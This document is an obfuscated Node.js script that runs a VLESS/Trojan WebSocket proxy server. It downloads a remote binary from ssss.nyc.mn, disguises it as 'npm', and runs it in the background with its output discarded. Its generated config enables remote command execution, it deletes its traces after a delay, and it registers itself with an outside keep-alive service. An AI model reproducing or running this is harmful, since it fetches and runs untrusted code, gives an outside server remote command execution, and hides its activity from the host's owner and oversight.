function _0x61e5(){const _0x4dea7f=['sub','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','index.html','arch','setsid\x20nohup\x20./npm\x20-s\x20','listen','pop','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','reduce','4603964fOcSDu','child_process','includes','catch','1234.abc.com','2053','write','split','readUInt16BE','send','&fp=chrome&type=ws&host=','arm','connect','Answer','trim','Server\x20is\x20running\x20on\x20port\x20','&type=A','https://oooo.serv00.net/add-url','true','close','end','pipe',':443?security=tls&sni=','2087','&path=%2F','npm\x20is\x20already\x20running,\x20skip\x20running...','39694070AzntiD','data','aarch64','npm\x20running\x20error:','axios','createWriteStream','http','utf-8','post','https://arm64.ssss.nyc.mn/v1','createHash','stream','concat','client_secret:\x20','message','2431902GwJDuj','application/json','finish','substr','buffer','1343022FXkbHM','npm\x20is\x20running','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','2083','utf8','443','slice','8443','1.1.1.1','Failed\x20to\x20resolve\x20','then','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','302e1afa-ef13-6d82-a558-bc12af689e38','\x20-p\x20','type','error','https://arm64.ssss.nyc.mn/agent','1414IiWhYE','digest','text/plain','log','5PxIiop','https://','every','https://amd64.ssss.nyc.mn/agent','chmod\x20+x\x20npm','url','npm','length','writeFileSync','toString','unlink','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','readUInt8','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','Automatic\x20Access\x20Task\x20added\x20successfully','false','4632gUDDgt','find','/bin/bash','decode','crypto','sha224','arm64','1171jeOCtz','2096','Not\x20Found\x0a','error:\x20','replace','path','10935uJUDPy','createServer','Server','join','8515388HFcvRS','https://api.ip.sb/geoip','update','Hello\x20world!','net',':443?encryption=none&security=tls&sni=','isp','trojan://','connection','writeHead','application/dns-json','config.yaml','map','get','once','hex','vless://'];_0x61e5=function(){return _0x4dea7f;};return _0x61e5();}const _0x210562=_0x3153;(function(_0x529f15,_0x1acca6){const _0x52d0a6=_0x3153,_0x334921=_0x529f15();while(!![]){try{const _0x61647a=-parseInt(_0x52d0a6(0xde))/0x1*(-parseInt(_0x52d0a6(0xc3))/0x2)+-parseInt(_0x52d0a6(0xad))/0x3+-parseInt(_0x52d0a6(0x84))/0x4+parseInt(_0x52d0a6(0xc7))/0x5*(-parseInt(_0x52d0a6(0xb2))/0x6)+-parseInt(_0x52d0a6(0xe8))/0x7+-parseInt(_0x52d0a6(0xd7))/0x8*(parseInt(_0x52d0a6(0xe4))/0x9)+parseInt(_0x52d0a6(0x9e))/0xa;if(_0x61647a===_0x1acca6)break;else _0x334921['push'](_0x334921['shift']());}catch(_0x394261){_0x334921['push'](_0x334921['shift']());}}}(_0x61e5,0xa8ea1));const os=require('os'),http=require(_0x210562(0xa4)),fs=require('fs'),axios=require(_0x210562(0xa2)),net=require(_0x210562(0xec)),path=require(_0x210562(0xe3)),crypto=require(_0x210562(0xdb)),{Buffer}=require(_0x210562(0xb1)),{exec,execSync}=require(_0x210562(0x85)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process.env.UUID||_0x210562(0xbe),NEZHA_SERVER=process.env.NEZHA_SERVER||'',NEZHA_PORT=process.env.NEZHA_PORT||'',NEZHA_KEY=process.env.NEZHA_KEY||'',DOMAIN=process.env.DOMAIN||_0x210562(0x88),AUTO_ACCESS=process.env.AUTO_ACCESS||!![],WSPATH=process.env.WSPATH||UUID[_0x210562(0xb8)](0x0,0x8),SUB_PATH=process.env.SUB_PATH||_0x210562(0xf9),NAME=process.env.NAME||'',PORT=process.env.PORT||0x1eb4;let ISP='';function _0x3153(_0x1248a6,_0x457b04){_0x1248a6=_0x1248a6-0x7c;const _0x61e5d1=_0x61e5();let _0x3153ec=_0x61e5d1[_0x1248a6];return _0x3153ec;}const GetISP=async()=>{const _0x3a42fa=_0x210562;try{const _0x419c10=await axios[_0x3a42fa(0xf5)](_0x3a42fa(0xe9)),_0x1167aa=_0x419c10['data'];ISP=(_0x1167aa['country_code']+'-'+_0x1167aa[_0x3a42fa(0xee)])['replace'](/ /g,'_');}catch(_0xfe108b){ISP='Unknown';}};GetISP();const httpServer=http[_0x210562(0xe5)]((_0x31882b,_0x25d543)=>{const _0x229073=_0x210562;if(_0x31882b[_0x229073(0xcc)]==='/'){const _0x4fe9c7=path[_0x229073(0xe7)](__dirname,_0x229073(0x7d));fs['readFile'](_0x4fe9c7,_0x229073(0xb6),(_0x45b2b8,_0x354ff0)=>{const _0x4eeaa6=_0x229073;if(_0x45b2b8){_0x25d543['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x25d543[_0x4eeaa6(0x98)](_0x4eeaa6(0xeb));return;}_0x25d543[_0x4eeaa6(0xf1)](0xc8,{'Content-Type':'text/html'}),_0x25d543[_0x4eeaa6(0x98)](_0x354ff0);});return;}else{if(_0x31882b[_0x229073(0xcc)]==='/'+SUB_PATH){const _0x2cac0e=NAME?NAME+'-'+ISP:ISP,_0x365cdd=_0x229073(0xf8)+UUID+'@'+DOMAIN+_0x229073(0xed)+DOMAIN+_0x229073(0x8e)+DOMAIN+_0x229073(0x9c)+WSPATH+'#'+_0x2cac0e,_0x56e29b=_0x229073(0xef)+UUID+'@'+DOMAIN+_0x229073(0x9a)+DOMAIN+_0x229073(0x8e)+DOMAIN+_0x229073(0x9c)+WSPATH+'#'+_0x2cac0e,_0x579db8=_0x365cdd+'\x0a'+_0x56e29b,_0x440b6e=Buffer['from'](_0x579db8)[_0x229073(0xd0)]('base64');_0x25d543['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x25d543['end'](_0x440b6e+'\x0a');}else _0x25d543['writeHead'](0x194,{'Content-Type':_0x229073(0xc5)}),_0x25d543['end'](_0x229073(0xe0));}}),wss=new WebSocket[(_0x210562(0xe6))]({'server':httpServer}),uuid=UUID[_0x210562(0xe2)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x210562(0xba)];function resolveHost(_0x3e44c8){return new Promise((_0x13a5ff,_0x37a00e)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x3e44c8)){_0x13a5ff(_0x3e44c8);return;}let _0x6cc9d1=0x0;function _0x2c14f7(){const _0xab8f82=_0x3153;if(_0x6cc9d1>=DNS_SERVERS['length']){_0x37a00e(new Error(_0xab8f82(0xbb)+_0x3e44c8+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x2a3c04=DNS_SERVERS[_0x6cc9d1];_0x6cc9d1++;const _0x3b48b7='https://dns.google/resolve?name='+encodeURIComponent(_0x3e44c8)+_0xab8f82(0x94);axios[_0xab8f82(0xf5)](_0x3b48b7,{'timeout':0x1388,'headers':{'Accept':_0xab8f82(0xf2)}})[_0xab8f82(0xbc)](_0x493fcb=>{const _0x532b57=_0xab8f82,_0x4e3341=_0x493fcb['data'];if(_0x4e3341['Status']===0x0&&_0x4e3341[_0x532b57(0x91)]&&_0x4e3341['Answer'][_0x532b57(0xce)]>0x0){const _0x3c256e=_0x4e3341[_0x532b57(0x91)][_0x532b57(0xd8)](_0x3eb80d=>_0x3eb80d[_0x532b57(0xc0)]===0x1);if(_0x3c256e){_0x13a5ff(_0x3c256e['data']);return;}}_0x2c14f7();})[_0xab8f82(0x87)](_0x36fd94=>{_0x2c14f7();});}_0x2c14f7();});}function handleVlessConnection(_0x437e5c,_0x58e66c){const _0x54b312=_0x210562,[_0x3a6578]=_0x58e66c,_0x5451b6=_0x58e66c['slice'](0x1,0x11);if(!_0x5451b6[_0x54b312(0xc9)]((_0x186080,_0x42eaa2)=>_0x186080==parseInt(uuid[_0x54b312(0xb0)](_0x42eaa2*0x2,0x2),0x10)))return![];let _0x489993=_0x58e66c[_0x54b312(0xb8)](0x11,0x12)[_0x54b312(0xd3)]()+0x13;const _0x4c64a5=_0x58e66c[_0x54b312(0xb8)](_0x489993,_0x489993+=0x2)[_0x54b312(0x8c)](0x0),_0x49602f=_0x58e66c[_0x54b312(0xb8)](_0x489993,_0x489993+=0x1)[_0x54b312(0xd3)](),_0xc4cd44=_0x49602f==0x1?_0x58e66c[_0x54b312(0xb8)](_0x489993,_0x489993+=0x4)[_0x54b312(0xe7)]('.'):_0x49602f==0x2?new TextDecoder()[_0x54b312(0xda)](_0x58e66c[_0x54b312(0xb8)](_0x489993+0x1,_0x489993+=0x1+_0x58e66c[_0x54b312(0xb8)](_0x489993,_0x489993+0x1)[_0x54b312(0xd3)]())):_0x49602f==0x3?_0x58e66c['slice'](_0x489993,_0x489993+=0x10)[_0x54b312(0x83)]((_0x388f29,_0x92ac66,_0x554bf9,_0x3b2489)=>_0x554bf9%0x2?_0x388f29[_0x54b312(0xaa)](_0x3b2489[_0x54b312(0xb8)](_0x554bf9-0x1,_0x554bf9+0x1)):_0x388f29,[])['map'](_0xb801cd=>_0xb801cd[_0x54b312(0x8c)](0x0)[_0x54b312(0xd0)](0x10))[_0x54b312(0xe7)](':'):'';_0x437e5c[_0x54b312(0x8d)](new Uint8Array([_0x3a6578,0x0]));const _0x2c42f0=createWebSocketStream(_0x437e5c);return resolveHost(_0xc4cd44)[_0x54b312(0xbc)](_0x380b84=>{const _0x4be6bf=_0x54b312;net['connect']({'host':_0x380b84,'port':_0x4c64a5},function(){const _0x36d204=_0x3153;this[_0x36d204(0x8a)](_0x58e66c[_0x36d204(0xb8)](_0x489993)),_0x2c42f0['on'](_0x36d204(0xc1),()=>{})['pipe'](this)['on'](_0x36d204(0xc1),()=>{})[_0x36d204(0x99)](_0x2c42f0);})['on'](_0x4be6bf(0xc1),()=>{});})[_0x54b312(0x87)](_0x1663fa=>{const _0x2e680f=_0x54b312;net[_0x2e680f(0x90)]({'host':_0xc4cd44,'port':_0x4c64a5},function(){const _0x20eb89=_0x2e680f;this[_0x20eb89(0x8a)](_0x58e66c[_0x20eb89(0xb8)](_0x489993)),_0x2c42f0['on']('error',()=>{})[_0x20eb89(0x99)](this)['on'](_0x20eb89(0xc1),()=>{})['pipe'](_0x2c42f0);})['on'](_0x2e680f(0xc1),()=>{});}),!![];}function handleTrojanConnection(_0x2345f7,_0x549c4c){const _0x4ed51c=_0x210562;try{if(_0x549c4c[_0x4ed51c(0xce)]<0x3a)return![];const _0x28f969=_0x549c4c[_0x4ed51c(0xb8)](0x0,0x38)['toString'](),_0x1d4ebe=[UUID];let _0x1f6777=null;for(const _0x37871a of _0x1d4ebe){const _0x444c84=crypto[_0x4ed51c(0xa8)](_0x4ed51c(0xdc))[_0x4ed51c(0xea)](_0x37871a)[_0x4ed51c(0xc4)](_0x4ed51c(0xf7));if(_0x444c84===_0x28f969){_0x1f6777=_0x37871a;break;}}if(!_0x1f6777)return![];let _0x627853=0x38;_0x549c4c[_0x627853]===0xd&&_0x549c4c[_0x627853+0x1]===0xa&&(_0x627853+=0x2);const _0x45688e=_0x549c4c[_0x627853];if(_0x45688e!==0x1)return![];_0x627853+=0x1;const _0x28316e=_0x549c4c[_0x627853];_0x627853+=0x1;let _0x4b61c0,_0x4e3122;if(_0x28316e===0x1)_0x4b61c0=_0x549c4c[_0x4ed51c(0xb8)](_0x627853,_0x627853+0x4)[_0x4ed51c(0xe7)]('.'),_0x627853+=0x4;else{if(_0x28316e===0x3){const _0x1c5454=_0x549c4c[_0x627853];_0x627853+=0x1,_0x4b61c0=_0x549c4c['slice'](_0x627853,_0x627853+_0x1c5454)[_0x4ed51c(0xd0)](),_0x627853+=_0x1c5454;}else{if(_0x28316e===0x4)_0x4b61c0=_0x549c4c['slice'](_0x627853,_0x627853+0x10)[_0x4ed51c(0x83)]((_0x5b475f,_0x19e6ed,_0x28bd42,_0x324753)=>_0x28bd42%0x2?_0x5b475f[_0x4ed51c(0xaa)](_0x324753[_0x4ed51c(0xb8)](_0x28bd42-0x1,_0x28bd42+0x1)):_0x5b475f,[])[_0x4ed51c(0xf4)](_0x5c4036=>_0x5c4036[_0x4ed51c(0x8c)](0x0)[_0x4ed51c(0xd0)](0x10))['join'](':'),_0x627853+=0x10;else return![];}}_0x4e3122=_0x549c4c[_0x4ed51c(0x8c)](_0x627853),_0x627853+=0x2;_0x627853<_0x549c4c[_0x4ed51c(0xce)]&&_0x549c4c[_0x627853]===0xd&&_0x549c4c[_0x627853+0x1]===0xa&&(_0x627853+=0x2);const _0x241407=createWebSocketStream(_0x2345f7);return resolveHost(_0x4b61c0)[_0x4ed51c(0xbc)](_0x479974=>{const _0x199028=_0x4ed51c;net[_0x199028(0x90)]({'host':_0x479974,'port':_0x4e3122},function(){const _0x57fec3=_0x199028;_0x627853<_0x549c4c[_0x57fec3(0xce)]&&this[_0x57fec3(0x8a)](_0x549c4c[_0x57fec3(0xb8)](_0x627853)),_0x241407['on']('error',()=>{})['pipe'](this)['on'](_0x57fec3(0xc1),()=>{})[_0x57fec3(0x99)](_0x241407);})['on'](_0x199028(0xc1),()=>{});})[_0x4ed51c(0x87)](_0x16ad58=>{const _0x9260fd=_0x4ed51c;net[_0x9260fd(0x90)]({'host':_0x4b61c0,'port':_0x4e3122},function(){const _0x37ef91=_0x9260fd;_0x627853<_0x549c4c['length']&&this[_0x37ef91(0x8a)](_0x549c4c[_0x37ef91(0xb8)](_0x627853)),_0x241407['on'](_0x37ef91(0xc1),()=>{})[_0x37ef91(0x99)](this)['on']('error',()=>{})[_0x37ef91(0x99)](_0x241407);})['on'](_0x9260fd(0xc1),()=>{});}),!![];}catch(_0x130f1a){return![];}}wss['on'](_0x210562(0xf0),(_0x41ffd4,_0x30a346)=>{const _0x117e09=_0x210562,_0x445ddf=_0x30a346[_0x117e09(0xcc)]||'';_0x41ffd4[_0x117e09(0xf6)](_0x117e09(0xac),_0x417a0e=>{const _0x3605d5=_0x117e09;if(_0x417a0e[_0x3605d5(0xce)]>0x11&&_0x417a0e[0x0]===0x0){const _0x55e293=_0x417a0e[_0x3605d5(0xb8)](0x1,0x11),_0x4599c3=_0x55e293[_0x3605d5(0xc9)]((_0x1b3aad,_0x4b4506)=>_0x1b3aad==parseInt(uuid[_0x3605d5(0xb0)](_0x4b4506*0x2,0x2),0x10));if(_0x4599c3){!handleVlessConnection(_0x41ffd4,_0x417a0e)&&_0x41ffd4[_0x3605d5(0x97)]();return;}}!handleTrojanConnection(_0x41ffd4,_0x417a0e)&&_0x41ffd4[_0x3605d5(0x97)]();})['on'](_0x117e09(0xc1),()=>{});});const getDownloadUrl=()=>{const _0x2f117d=_0x210562,_0x27b98b=os[_0x2f117d(0x7e)]();return _0x27b98b===_0x2f117d(0x8f)||_0x27b98b===_0x2f117d(0xdd)||_0x27b98b===_0x2f117d(0xa0)?!NEZHA_PORT?_0x2f117d(0xa7):_0x2f117d(0xc2):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x2f117d(0xca);},downloadFile=async()=>{const _0x4aed00=_0x210562;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0xdba7b6=getDownloadUrl(),_0xe5f02f=await axios({'method':_0x4aed00(0xf5),'url':_0xdba7b6,'responseType':_0x4aed00(0xa9)}),_0x2ad974=fs[_0x4aed00(0xa3)](_0x4aed00(0xcd));return _0xe5f02f[_0x4aed00(0x9f)][_0x4aed00(0x99)](_0x2ad974),new Promise((_0x759666,_0x4933d3)=>{const _0xa89b9b=_0x4aed00;_0x2ad974['on'](_0xa89b9b(0xaf),()=>{const _0x1c2d0c=_0xa89b9b;console[_0x1c2d0c(0xc6)]('npm\x20download\x20successfully'),exec(_0x1c2d0c(0xcb),_0x3ed5cf=>{if(_0x3ed5cf)_0x4933d3(_0x3ed5cf);_0x759666();});}),_0x2ad974['on'](_0xa89b9b(0xc1),_0x4933d3);});}catch(_0x86c5d9){throw _0x86c5d9;}},runnz=async()=>{const _0x1bc331=_0x210562;try{const _0x434db4=execSync(_0x1bc331(0x7c),{'encoding':_0x1bc331(0xa5)});if(_0x434db4[_0x1bc331(0x92)]()!==''){console[_0x1bc331(0xc6)](_0x1bc331(0x9d));return;}}catch(_0x38feae){}await downloadFile();let _0x20a530='',_0x12b78a=[_0x1bc331(0xb7),_0x1bc331(0xb9),_0x1bc331(0xdf),_0x1bc331(0x9b),_0x1bc331(0xb5),_0x1bc331(0x89)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x26a895=_0x12b78a[_0x1bc331(0x86)](NEZHA_PORT)?'--tls':'';_0x20a530=_0x1bc331(0x7f)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1bc331(0xbf)+NEZHA_KEY+'\x20'+_0x26a895+_0x1bc331(0xb4);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x56c1fb=NEZHA_SERVER[_0x1bc331(0x86)](':')?NEZHA_SERVER[_0x1bc331(0x8b)](':')[_0x1bc331(0x81)]():'',_0x438a06=_0x12b78a[_0x1bc331(0x86)](_0x56c1fb)?_0x1bc331(0x96):_0x1bc331(0xd6),_0x434478=_0x1bc331(0xab)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x1bc331(0xd2)+_0x438a06+_0x1bc331(0x82)+UUID;fs[_0x1bc331(0xcf)](_0x1bc331(0xf3),_0x434478);}_0x20a530=_0x1bc331(0xd4);}else{console['log'](_0x1bc331(0xbd));return;}}try{exec(_0x20a530,{'shell':_0x1bc331(0xd9)},_0x56fc4b=>{const _0x17ee21=_0x1bc331;if(_0x56fc4b)console[_0x17ee21(0xc1)](_0x17ee21(0xa1),_0x56fc4b);else console[_0x17ee21(0xc6)](_0x17ee21(0xb3));});}catch(_0x24f740){console[_0x1bc331(0xc1)](_0x1bc331(0xe1)+_0x24f740);}};async function addAccessTask(){const _0xc3af04=_0x210562;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1b17f2=_0xc3af04(0xc8)+DOMAIN;try{const _0xc232ce=await axios[_0xc3af04(0xa6)](_0xc3af04(0x95),{'url':_0x1b17f2},{'headers':{'Content-Type':_0xc3af04(0xae)}});console[_0xc3af04(0xc6)](_0xc3af04(0xd5));}catch(_0x53e057){}}const delFiles=()=>{const _0x1b07eb=_0x210562;fs[_0x1b07eb(0xd1)](_0x1b07eb(0xcd),()=>{}),fs[_0x1b07eb(0xd1)](_0x1b07eb(0xf3),()=>{});};httpServer[_0x210562(0x80)](PORT,()=>{const _0x2b184a=_0x210562;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x2b184a(0xc6)](_0x2b184a(0x93)+PORT);});
